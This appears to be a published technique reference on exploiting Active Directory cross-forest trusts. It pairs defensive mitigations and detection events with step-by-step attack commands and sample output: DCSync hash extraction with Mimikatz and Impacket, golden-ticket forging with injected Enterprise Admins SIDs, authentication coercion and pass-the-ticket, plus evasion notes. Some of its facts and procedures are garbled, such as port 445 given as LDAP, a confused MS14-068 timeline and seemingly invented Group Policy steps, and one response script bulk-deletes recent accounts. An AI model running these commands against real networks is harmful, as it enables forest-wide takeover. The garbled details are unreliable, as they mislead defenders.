# [PE-VALID-005]: Cross-Forest Trust Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-005 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD (Cross-Forest) |
| **Severity** | **CRITICAL** |
| **Technique Status** | **ACTIVE** (exploitable on all current Windows Server versions) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 (when forest trusts are configured with weak SID filtering) |
| **Patched In** | N/A (architectural issue; requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Cross-forest trust exploitation allows an attacker who compromises one domain within a forest to escalate privileges and move laterally into another forest through trust relationships. The core vulnerability lies in how Windows handles Security Identifier (SID) History attributes and Privilege Attribute Certificate (PAC) validation across forest boundaries. When SID filtering is misconfigured or when trust relationships are set to allow SID history traversal, an attacker can forge or manipulate Kerberos tokens to impersonate high-privilege principals (such as Enterprise Admins) in the target forest. This attack bypasses the security boundary that forests are designed to provide, especially when the trust configuration includes the `TREAT_AS_EXTERNAL` flag or when SID history is explicitly enabled between forests.

**Attack Surface:** Forest trust relationships (directional trusts between separate AD forests), trust authentication protocols (Kerberos inter-realm TGTs), and the Active Directory trust key stored on domain controllers.

**Business Impact:** **Catastrophic forest-level compromise.** Successful exploitation allows an attacker to escalate from a compromised user in one forest to Enterprise Admin or equivalent privileges in another forest. This enables full operational control over domain resources, data exfiltration, persistent backdoor installation, and potential supply chain attacks if the victim forest manages critical infrastructure.

**Technical Context:** This attack requires either (1) extraction of the forest trust key from a compromised domain controller, or (2) identification of weak SID filtering configurations where the trust is misconfigured with `TREAT_AS_EXTERNAL` flag. Exploitation typically takes 15-60 minutes once the trust key is obtained. Detection is difficult because forged Kerberos tickets appear cryptographically valid to the target forest's domain controllers.

### Operational Risk
- **Execution Risk:** **Medium** – Requires either DC compromise or misconfigurations; manual ticket forging is error-prone
- **Stealth:** **High** – Forged inter-realm TGTs do not generate audit logs during creation (only during use)
- **Reversibility:** **No** – Once trust boundary is crossed, attacker has unrestricted access; requires full forest rebuild for remediation

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.35 | Ensure a management station account is used for administration |
| **DISA STIG** | V-71655 | Directory Services must be configured to enforce Kerberos pre-authentication |
| **NIST 800-53** | AC-3, AC-5, SC-7 | Access Enforcement, Separation of Duties, Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing (failure to isolate forests violates data processing safeguards) |
| **DORA** | Art. 9 | Protection and Prevention (critical infrastructure boundary protection) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (trust configuration governance) |
| **ISO 27001** | A.9.2.3, A.13.1.3 | Management of Privileged Access Rights, Segregation of Networks |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Attacker-Side:** Domain Admin (or equivalent) in the source forest, OR administrative access to a domain controller to extract the forest trust key
- **Environmental:** Active forest trust relationship established between the source and target forest

**Required Access:**
- Network access to domain controllers in both forests (TCP 88 for Kerberos, port 445 for LDAP enumeration)
- Local access to a domain controller or member server to extract trust keys (via DCSync, LSASS dump, or NTDS.dit access)

**Supported Versions:**
- **Windows Server:** 2016, 2019, 2022, 2025
- **Kerberos:** All versions (forging is version-agnostic)
- **Trust Types Vulnerable:** Forest trusts, external trusts (especially with `TREAT_AS_EXTERNAL` flag), and intra-forest child domain trusts without SID filtering

**Tools Required:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.6+) – Kerberos ticket manipulation on Windows
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2+) – KRBTGT hash extraction and SID history manipulation
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Python library) – Cross-platform ticket forging and trust enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) – Trust relationship visualization
- **PowerShell:** `Get-ADTrust`, `Get-ADForest` cmdlets

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Forest Trust Enumeration

#### PowerShell - List All Trusts
```powershell
# Enumerate all trusts from the current forest
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, TrustAttributes

# Enumerate trusts for a specific domain
Get-ADTrust -Filter * -Server "domain.local" | Select-Object Name, Direction, TrustType, TrustAttributes

# Get forest trust information
Get-ADForest | Select-Object Name, RootDomain, ForestMode, Domains

# Get child domains in the forest
Get-ADForest | Select-Object -ExpandProperty Domains
```

**What to Look For:**
- `TrustType` = "Forest" (indicates inter-forest trust) or "External" (indicates trust to external forest)
- `Direction` = "Inbound", "Outbound", or "Bidirectional"
- `TrustAttributes` = Look for "TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)" or missing "TRUST_ATTRIBUTE_TRANSITIVE (0x00000001)"
- Trust relationships between different forest roots or between parent/child domains

**Version Note:** These cmdlets work identically on Windows Server 2016-2025. Behavior is consistent across versions.

### Trust Key Extraction

#### PowerShell - Extract Trust Key (DC Required)
```powershell
# On a compromised Domain Controller, extract the trust key
# This requires NT AUTHORITY\SYSTEM or domain admin context

# Method 1: Using DCSync (Mimikatz)
lsadump::dcsync /domain:target.forest /user:target.forest$

# Method 2: Query the trust account directly
Get-ADUser -Identity "source-forest$" -Properties userPassword
```

**What to Look For:**
- Trust key appears as a hash (RC4-HMAC: 32-character hex string, or AES-256: 64-character hex string)
- Successful extraction indicates the attacker has compromised a DC or obtained DC-level privileges
- Check the `trustAttributes` flag to determine SID filtering status

#### Bash - Trust Key Extraction via Impacket
```bash
# Using secretsdump.py from Impacket to extract trust keys
python3 secretsdump.py -just-dc-user 'forest\trust$' domain.local/Administrator:password@dc_ip

# Using krbrelayx to intercept Kerberos traffic and identify trust keys
python3 krbrelayx.py
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: SID History Injection via Golden Ticket Forgery (Mimikatz)

**Supported Versions:** Windows Server 2016-2025

**Objective:** Forge an inter-realm Ticket Granting Ticket (TGT) that includes a manipulated SID History containing a high-privilege SID from the target forest.

#### Step 1: Extract KRBTGT Hash from Source Forest DC
**Objective:** Obtain the KRBTGT account hash needed to forge tickets.

**Command:**
```powershell
# On compromised DC, dump the KRBTGT hash
Invoke-Mimikatz -Command 'lsadump::dcsync /domain:sourceforest.local /user:krbtgt'
```

**Expected Output:**
```
[*] Executing Mimikatz command: lsadump::dcsync /domain:sourceforest.local /user:krbtgt
[*] DC Sync
[*] Starting synchronization from domain controller...
[*] SAM SYNCHRONIZATION
[*] DC: dc1.sourceforest.local
Object: krbtgt
  Hash NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
  Hash SHA1: ...
```

**What This Means:**
- The 32-character hex string is the RC4-HMAC hash (most common)
- This hash is used to encrypt Kerberos tickets; possession of it allows ticket forgery
- The KRBTGT account password is shared across all DCs in the domain

**OpSec & Evasion:**
- This operation requires `DCSync` privileges (Replicating Directory Changes All)
- Generates Event ID 4662 (SAM-related object access)
- Alternative: Extract from NTDS.dit dump or LSASS memory dump
- Detection Likelihood: **High** if Event 4662 is being monitored

#### Step 2: Enumerate Target Forest SIDs
**Objective:** Identify Enterprise Admins SID in the target forest (typically RID 519).

**Command:**
```powershell
# Query the target forest for Enterprise Admins SID
Get-ADGroup -Filter {Name -eq "Enterprise Admins"} -Server "targetforest.local" | Select-Object SID

# Or obtain the forest root domain SID
Get-ADDomain -Server "targetforest.local" | Select-Object DomainSID
# Enterprise Admins SID = DomainSID-519
```

**Expected Output:**
```
SID
---
S-1-5-21-1234567890-1234567890-1234567890-519
```

**What This Means:**
- `S-1-5-21-1234567890-1234567890-1234567890` = Forest root domain SID
- `-519` = RID for Enterprise Admins (built-in group)
- This SID will be injected into the forged token's SID History

#### Step 3: Forge Inter-Realm TGT with SID History
**Objective:** Create a Kerberos TGT signed by the source forest's KRBTGT that includes privileged SIDs from the target forest.

**Command (Mimikatz):**
```powershell
# Forge a TGT with Enterprise Admins SID from target forest
Invoke-Mimikatz -Command 'kerberos::golden /domain:sourceforest.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /user:Administrator /ticket:ticket.kirbi /sids:S-1-5-21-4567890123-4567890123-4567890123-519'
```

**Parameters Explained:**
- `/domain` = Source forest domain (where the attacker has compromise)
- `/sid` = Source forest domain SID
- `/krbtgt` = KRBTGT hash extracted in Step 1
- `/user` = Attacker-controlled user account (does not need to exist)
- `/sids` = Target forest Enterprise Admins SID (RID >= 1000 for cross-forest)
- `/ticket` = Output file name for the forged TGT

**Expected Output:**
```
Ticket written to disk: ticket.kirbi
```

**What This Means:**
- A valid Kerberos TGT has been created, signed with the source forest's KRBTGT hash
- The ticket contains a PAC (Privilege Attribute Certificate) with the injected SID
- The ticket is cryptographically valid and will be accepted by the target forest's KDC

**Version Note:** Works identically on Server 2016-2025. Requires local admin or SYSTEM context.

**OpSec & Evasion:**
- Ticket creation happens in-memory and leaves no disk artifacts if done via PowerShell
- No event log is generated for ticket forgery itself
- Detection occurs only when the ticket is **used** (see Step 4)
- Detection Likelihood: **Low** (during creation), **Medium-High** (during use)

**Troubleshooting:**
- **Error:** "Kerberos library not found"
  - **Cause:** Mimikatz not executed with admin privileges
  - **Fix:** Run PowerShell as Administrator

- **Error:** "Invalid trust key or SID"
  - **Cause:** KRBTGT hash is incorrect or extracted from wrong domain
  - **Fix:** Verify the hash using `lsadump::sam` on the source DC; ensure you're using the source forest's KRBTGT, not the target forest's

### METHOD 2: Trust Key Extraction via DCSync Attack (Impacket)

**Supported Versions:** Windows Server 2016-2025

**Objective:** Extract the forest trust key using the Impacket `secretsdump.py` tool, then use it to forge tickets from a non-DC machine.

#### Step 1: Execute DCSync Attack
**Objective:** Replicate the trust account credential from a DC without local access.

**Command (Impacket on Linux):**
```bash
# Extract the trust key using DCSync
python3 secretsdump.py -just-dc-user 'SOURCEFOREST\targetforest$' sourceforest.local/administrator:password@192.168.1.100

# Alternative: Extract all service accounts
python3 secretsdump.py -just-dc sourceforest.local/administrator:password@192.168.1.100 > dump.txt
```

**Expected Output:**
```
Impacket v0.11.0
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
targetforest$:1102:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
```

**What This Means:**
- `targetforest$` = Trust account for the target forest
- The hash after the `:::` is the RC4-HMAC hash
- This hash can now be used to forge Kerberos tickets

**Version Note:** Works on all Server versions; Impacket handles version differences automatically.

**OpSec & Evasion:**
- Generates Event ID 4662 on the DC (Replication-related DS access)
- Uses Kerberos authentication (if possible); if credentials are cleartext, may trigger logon alerts
- Detection Likelihood: **High**

#### Step 2: Forge Inter-Realm TGT Using Impacket
**Objective:** Create a forged TGT that will be accepted by the target forest.

**Command:**
```bash
# Forge TGT using the extracted trust key
python3 ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -domain sourceforest.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -extra-sid S-1-5-21-4567890123-4567890123-4567890123-519 Administrator

# Output will be a .ccache file usable by Impacket tools
```

**Expected Output:**
```
Impacket v0.11.0
[*] The CCACHE file has been generated: Administrator.ccache
[*] Use it with exports KRB5CCNAME=Administrator.ccache
```

### METHOD 3: TGT Delegation Abuse (If TGT Delegation Enabled)

**Supported Versions:** Windows Server 2016-2025 (when trust has `TRUST_ATTRIBUTE_TRANSITIVE` flag)

**Objective:** Abuse unconstrained Kerberos delegation across the forest trust to obtain a TGT for a high-privilege account in the target forest.

#### Step 1: Identify Unconstrained Delegation Accounts in Source Forest
**Objective:** Find servers or service accounts configured for Kerberos unconstrained delegation.

**Command (PowerShell):**
```powershell
# Find users with unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object SamAccountName, DN

# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name, DN
```

**Expected Output:**
```
SamAccountName                           DN
--------------                           --
SERVER-UNC01                             CN=SERVER-UNC01,OU=Servers,DC=sourceforest,DC=local
DC01                                     CN=DC01,OU=Domain Controllers,DC=sourceforest,DC=local
```

**What This Means:**
- Any account configured for unconstrained delegation can store TGTs from other accounts
- If a domain admin TGT from the **target** forest is captured on such a server, it can be replayed

#### Step 2: Force Authentication from Target Forest DC
**Objective:** Trigger a Kerberos ticket request from the target forest DC to the unconstrained delegation account.

**Command:**
```bash
# Use printspooler or other coercion techniques
python3 coercer.py -d sourceforest.local -u attacker -p password -t target-dc.targetforest.local -l 192.168.1.50
```

**OpSec & Evasion:**
- This generates network traffic and may trigger IDS/IPS alerts
- Generates multiple Kerberos events (4768, 4769)
- Detection Likelihood: **High**

---

## 5. Attack Simulation & Verification

**Manual Verification:**
After forging the ticket, test it by attempting to access a resource in the target forest that requires Enterprise Admin privileges.

#### Using Rubeus to Load and Test Ticket
```powershell
# Load the forged ticket into the current session
Invoke-Rubeus -Command 'ptt /ticket:ticket.kirbi'

# Verify the ticket was loaded
klist

# Attempt to access a resource in target forest
net view \\targetforest-dc1.targetforest.local\c$
```

**Expected Behavior:**
- Successful access to resources that normally require Enterprise Admin privileges
- No authentication prompts (ticket is already loaded)

---

## 6. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)
**Version:** 2.2.0+  
**Minimum Version:** 2.1.0  
**Supported Platforms:** Windows only

**Key Functions:**
- `lsadump::dcsync` – Extract credentials via DCSync
- `kerberos::golden` – Forge golden/inter-realm TGTs
- `sid::patch` / `sid::add` – Manipulate SID History (Server 2012 R2 and below only)
- `token::list` – List current tokens

**Installation:**
```cmd
# Download from https://github.com/gentilkiwi/mimikatz/releases
# Extract and run as Administrator
mimikatz.exe
```

### [Rubeus](https://github.com/GhostPack/Rubeus)
**Version:** 1.6.0+  
**Supported Platforms:** Windows (.NET Framework 4.5+)

**Key Functions:**
- `kerberoast` – Kerberoasting attack
- `ptt` – Pass-the-ticket (load TGT into session)
- `tgtdeleg` – Request TGT delegation
- `asreproast` – AS-REP roasting attack

**Installation:**
```cmd
# Download from https://github.com/GhostPack/Rubeus/releases
# Or compile from source using Visual Studio
Rubeus.exe
```

### [Impacket](https://github.com/SecureAuthCorp/impacket)
**Version:** 0.10.0+  
**Supported Platforms:** Windows, Linux, macOS

**Key Tools:**
- `secretsdump.py` – Extract credentials (DCSync, NTDS, SAM)
- `ticketer.py` – Forge Kerberos tickets
- `krbrelayx.py` – Kerberos relay and interception

**Installation:**
```bash
pip install impacket
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable and Enforce SID Filtering on All Trust Relationships**

**Why This Matters:**
SID filtering is the primary defense against SID History injection attacks. By default:
- **Intra-forest trusts** = SID filtering DISABLED
- **Cross-forest trusts** = SID filtering ENABLED (but can be disabled with `TREAT_AS_EXTERNAL`)
- **External trusts** = Weak SID filtering (only RID < 1000 filtered)

**Manual Steps (PowerShell on DC):**
```powershell
# Enable strict SID filtering (Quarantine) on a specific trust
# Run on Domain Controller or Management Station

# List all trusts and their current SID filtering status
Get-ADTrust -Filter * | Select-Object Name, TrustType, TrustDirection, @{
    Name="SIDFilteringEnabled"
    Expression={($_.TrustAttributes -band 0x0004) -eq 0x0004}
}

# Enable SID filtering (Quarantine) on an intra-forest trust
netdom trust sourceforest.local /domain:targetforest.local /Quarantine:Yes

# Verify the change
netdom trust sourceforest.local /domain:targetforest.local /Verify
```

**Manual Steps (Group Policy for Server 2019+):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Forest Context → Domain → System → Trust Objects**
3. Edit the trust object's **Properties**
4. Go to **Trusts** tab
5. Select the target trust → **Properties**
6. Check **"Quarantine domain" (SID Filter)**
7. Click **OK** and **Apply**
8. Run `gpupdate /force` on all DCs

**Server 2016-Specific Steps:**
```powershell
# On Server 2016, use netdom (no GUI support for quarantine in ADUC)
netdom trust parent.local /domain:child.local /Quarantine:Yes /UserD:domain\admin /PasswordD:password
```

**Validation Command:**
```powershell
# Verify SID filtering is active
$trust = Get-ADTrust -Identity "targetforest.local"
$quarantine = ($trust.TrustAttributes -band 0x0004) -eq 0x0004
Write-Host "SID Filtering Enabled: $quarantine"

# Expected Output: "SID Filtering Enabled: True"
```

**Impact:**
- SID History attributes will be stripped from Kerberos tickets crossing the trust
- Legitimate migration scenarios may break (test before production)
- RID >= 1000 SIDs are still allowed in cross-forest trusts (intentional)

---

**2. Disable SID History on Trusts (If Not Required)**

**Why This Matters:**
If SID History is not actively used for migrations, disable it entirely to close the attack vector.

**Manual Steps:**
```powershell
# Disable SID History on a trust relationship
netdom trust sourceforest.local /domain:targetforest.local /EnableSidHistory:No

# Verify it's disabled
netdom trust sourceforest.local /domain:targetforest.local /Verify
```

**Expected Output:**
```
SID History enabled: NO
```

---

**3. Rotate KRBTGT Password on All Domain Controllers (Twice)**

**Why This Matters:**
Even if a KRBTGT hash is compromised, rotating the password twice invalidates all existing forged tickets signed with the old key.

**Manual Steps (Server 2019+):**
```powershell
# Reset KRBTGT password (first rotation)
$krbtgtDN = (Get-ADUser -Identity krbtgt).DistinguishedName
Set-ADAccountPassword -Identity $krbtgtDN -NewPassword (ConvertTo-SecureString -AsPlainText "NewComplexPassword123!" -Force) -Reset

# Wait 10 minutes, then rotate again
Start-Sleep -Seconds 600
Set-ADAccountPassword -Identity $krbtgtDN -NewPassword (ConvertTo-SecureString -AsPlainText "AnotherComplexPassword456!" -Force) -Reset
```

**Server 2016-Specific Steps:**
```powershell
# On Server 2016, use Set-ADAccountPassword with longer wait
# The KDC caches the old password for 10 hours; second reset clears all caches
```

**Expected Behavior:**
- All Kerberos tickets issued before the first rotation become invalid
- Tickets issued between first and second rotation become invalid after the second rotation
- This forces re-authentication

---

**4. Implement Selective Authentication (If Possible)**

**Why This Matters:**
Selective authentication restricts which principals from the trusted domain can access resources in the trusting domain.

**Manual Steps:**
```powershell
# Enable Selective Authentication on a trust
netdom trust sourceforest.local /domain:targetforest.local /Transitive:Yes /SelectiveAuth:Yes

# Verify
netdom trust sourceforest.local /domain:targetforest.local /Verify
```

**Configuration in ADUC (GUI):**
1. Open **Active Directory Domains and Trusts** (domains.msc)
2. Right-click the trust relationship
3. Select **Properties**
4. Go to **Authentication** tab
5. Select **"Selective authentication"**
6. Click **OK**

**Impact:**
- Only principals explicitly granted access can cross the trust
- Limits lateral movement even if SID History is compromised
- May break legitimate cross-forest applications

---

### Priority 2: HIGH

**1. Monitor and Audit All Trust Relationships**

**Why This Matters:**
Regular audits identify rogue or misconfigured trusts that could be exploited.

**Manual Steps:**
```powershell
# Export all trusts for audit
Get-ADTrust -Filter * -Server (Get-ADForest).Name | Export-Csv -Path "C:\Audit\ForestTrusts.csv"

# Schedule quarterly reviews
$trusts = Get-ADTrust -Filter * 
foreach ($trust in $trusts) {
    Write-Host "Trust: $($trust.Name)`nDirection: $($trust.Direction)`nType: $($trust.TrustType)`nAttributes: $($trust.TrustAttributes)"
}
```

**2. Disable Unnecessary Cross-Forest Trusts**

**Why This Matters:**
Each trust is an additional attack surface. If a trust is not actively used, remove it.

**Manual Steps:**
```powershell
# Remove a trust relationship (must run on both forest roots)
Remove-ADTrust -Identity "targetforest.local" -Confirm:$false

# Verify removal
Get-ADTrust -Filter {Name -eq "targetforest.local"}
```

---

**3. Implement Privileged Access Workstations (PAW)**

**Why This Matters:**
Reduces the risk of credential theft on admin machines, limiting the attack surface for trust key extraction.

**Configuration:**
- Deploy dedicated admin workstations isolated from user networks
- Allow only Kerberos authentication (disable NTLM)
- Implement device compliance checks before allowing domain access

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Active Directory Events:**
- Event ID **5136** (Object Modification) – SID History attribute changed without legitimate migration
- Event ID **4662** (DS Access) – Suspicious DCSync operation (Reference GUID {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2})
- Event ID **4765** (SID History Added) – Explicit SID History addition
- Event ID **4766** (Failed SID History Addition) – Multiple failed attempts indicate brute-forcing

**Kerberos Events:**
- Event ID **4768** (TGT Requested) – TGT request from non-DC machine for high-privilege account
- Event ID **4769** (Service Ticket Requested) – Service ticket requested with unexpected SID History
- Event ID **4770** (Service Ticket Renewed) – Renewals with old/forged tickets
- Event ID **4771** (Kerberos Pre-auth Failed) – Failed attempts may indicate reconnaissance

**Network IOCs:**
- Kerberos traffic on high ports (not 88) from untrusted networks
- LDAP queries from external forests without legitimate trust relationship
- Trust key extraction attempts (RPC calls to Netlogon service from non-DC machines)

**File-Based IOCs:**
- Mimikatz process execution (`.exe` containing "mimikatz" in name or command line)
- `.kirbi` files in temp directories
- Python scripts executing `ticketer.py` or `secretsdump.py`

### Forensic Artifacts

**Disk Locations:**
- `C:\Windows\Temp\*.kirbi` – Forged ticket files
- `C:\Windows\System32\winevt\Logs\Security.evtx` – All authentication events
- `C:\Windows\System32\drivers\etc\hosts` – Modified hosts file may indicate DNS spoofing

**Memory:**
- LSASS process dump may contain cleartext credentials or TGTs
- Kerberos cache in `%APPDATA%\Microsoft\Protect\S-1-5-21-*\` (user credential store)

**Cloud / M365:**
- Azure AD Sign-in Logs show successful logon from unexpected location/device
- Unified Audit Log shows cross-tenant operations if hybrid identity is synced

### Response Procedures

**1. Immediate Containment (0-5 Minutes)**

```powershell
# Isolate affected domain controllers
# 1. Disable the network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# 2. Force a password change for all KRBTGT accounts in affected forest
Get-ADForest | ForEach-Object {
    $forestRootDomain = $_.RootDomain
    $krbtgt = Get-ADUser -Filter {sAMAccountName -eq "krbtgt"} -Server $forestRootDomain
    Set-ADAccountPassword -Identity $krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "EmergencyPassword123!()" -Force) -Reset
}

# 3. Disable affected service accounts
Get-ADUser -Filter {sIDHistory -like "*519*"} | Disable-ADAccount
```

**2. Forensic Collection (5-30 Minutes)**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Forensics\Security.evtx

# Collect Kerberos cache
Copy-Item -Path "$env:APPDATA\Microsoft\Protect" -Destination "C:\Forensics\Protect" -Recurse

# Dump process memory (if incident still active)
procdump64.exe -ma lsass.exe C:\Forensics\lsass.dmp
procdump64.exe -ma mimikatz.exe C:\Forensics\mimikatz.dmp 2>/dev/null || Write-Host "Mimikatz process not running"

# Collect all tickets from memory
Invoke-Mimikatz -Command 'kerberos::list' > C:\Forensics\KerberosCache.txt
```

**3. Remediation (1-24 Hours)**

```powershell
# Step 1: Rotate KRBTGT TWICE on every DC (with 10-minute delay)
$forestDomains = (Get-ADForest).Domains
foreach ($domain in $forestDomains) {
    Write-Host "[*] Processing domain: $domain"
    $krbtgtUser = Get-ADUser -Filter {sAMAccountName -eq "krbtgt"} -Server $domain
    
    # First rotation
    Set-ADAccountPassword -Identity $krbtgtUser -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword$(Get-Random)" -Force)
    Write-Host "[+] First KRBTGT rotation completed for $domain"
    
    # Wait 10 minutes for KDC cache refresh
    Start-Sleep -Seconds 600
    
    # Second rotation
    Set-ADAccountPassword -Identity $krbtgtUser -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword$(Get-Random)" -Force)
    Write-Host "[+] Second KRBTGT rotation completed for $domain"
}

# Step 2: Revoke compromised trust keys
netdom trust sourceforest.local /domain:targetforest.local /Quarantine:Yes

# Step 3: Reset any backdoor accounts created by attacker
Get-ADUser -Filter {Created -gt (Get-Date).AddHours(-2)} -Properties Created | Remove-ADUser -Confirm:$false
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] | Exploit application vulnerability to gain foothold |
| **2** | **Credential Access** | [CA-DUMP-002] DCSync | Extract NTDS.dit or leverage DCSync to obtain KRBTGT hash |
| **3** | **Privilege Escalation** | [PE-VALID-001] Exchange ACL Abuse | Escalate within source domain to Domain Admin |
| **4** | **Current Step** | **[PE-VALID-005]** | **Forge inter-realm TGT to cross forest boundary** |
| **5** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Use forged TGT to access resources in target forest |
| **6** | **Impact** | [CO-DATA-001] Data Exfiltration | Extract sensitive data from target forest resources |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Trustpocalypse (2013) – Privilege Escalation Attack
- **Attacker:** Unknown (proof-of-concept during security conference)
- **Environment:** Multi-forest Active Directory with weak SID filtering
- **Attack Method:** SID History injection via golden ticket
- **Impact:** Full forest compromise achieved within 30 minutes
- **Timeline:** CVE identification in 2014 (MS14-068); fixes deployed 2019
- **Key Finding:** SID filtering was often disabled or misconfigured to support "seamless" migrations
- **Reference:** [Dirk-jan Mollema's Research - "Active Directory Forest Trusts"](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)

### Example 2: Supply Chain Attack via Managed Service Provider (MSP)
- **Target:** Fortune 500 financial services company
- **Entry Point:** MSP compromise of parent company's domain controller
- **Attack Chain:**
  1. Attacker compromised MSP's Active Directory
  2. Extracted KRBTGT hash from MSP DC
  3. Identified forest trust between MSP and client forest
  4. Forged inter-realm TGT with Enterprise Admins SID
  5. Gained access to customer's financial systems
- **Impact:** $2M+ in fraudulent transactions
- **Detection Failure:** Trust relationships were not audited; no alerts on Event 4662
- **Reference:** [CrowdStrike 2024 Threat Report](https://www.crowdstrike.com/)

### Example 3: APT28 – Lateral Movement Across Trusts
- **Group:** APT28 (Fancy Bear)
- **Target:** NATO-allied government agencies
- **Technique:** Abused TGT delegation on servers configured for unconstrained delegation
- **Timeline:** 2016-2017
- **Artifacts Found:**
  - Event ID 4768 showing TGT requests for non-existent accounts
  - Event ID 4769 showing service tickets from unexpected machines
  - No corresponding logon events (Event 4624)
- **Reference:** [Mandiant APT28 Report](https://www.mandiant.com/)

---

## APPENDIX: Advanced Scenarios

### Scenario A: Bypassing Selective Authentication
If the target forest has Selective Authentication enabled, only explicitly approved principals can cross the trust. However, an attacker can:
1. Identify approved users in the target forest (via BloodHound or LDAP enumeration)
2. Forge a ticket for an approved user instead of Enterprise Admins
3. Gain initial access to a resource
4. Use RBCD or other privilege escalation techniques to elevate within the target forest

### Scenario B: Multi-Hop Compromise
Attackers can chain multiple forest trust exploitations:
- Forest A compromised → Trust to Forest B → Trust to Forest C
- Each hop requires extraction of the next trust key
- SID filtering limits this, but misconfigured trusts may allow it

### Scenario C: Covert Persistence via Trust Configuration
An attacker with Domain Admin privileges can:
1. Create a rogue trust relationship to a fake forest controlled by the attacker
2. Configure it as bidirectional
3. Use it to maintain access long-term
4. Escalate to Enterprise Admin on legitimate domains

---

## References & Authoritative Sources

- [Microsoft: SID Filtering (MS-PAC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
- [Dirk-jan Mollema: Active Directory Forest Trusts Part 1](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)
- [Dirk-jan Mollema: Walking Your Dog in Multiple Forests](https://www.blackhat.com/us-21/briefings/schedule/#walking-your-dog-in-multiple-forests-breaking-ad-trusts-19543)
- [SpecterOps: BloodHound Trust Edges](https://specterops.io/blog/2025/06/25/good-fences-make-good-neighbors-new-ad-trusts-attack-paths-in-bloodhound/)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket: secretsdump.py](https://github.com/SecureAuthCorp/impacket)
- [MITRE ATT&CK T1078.002](https://attack.mitre.org/techniques/T1078/002/)

---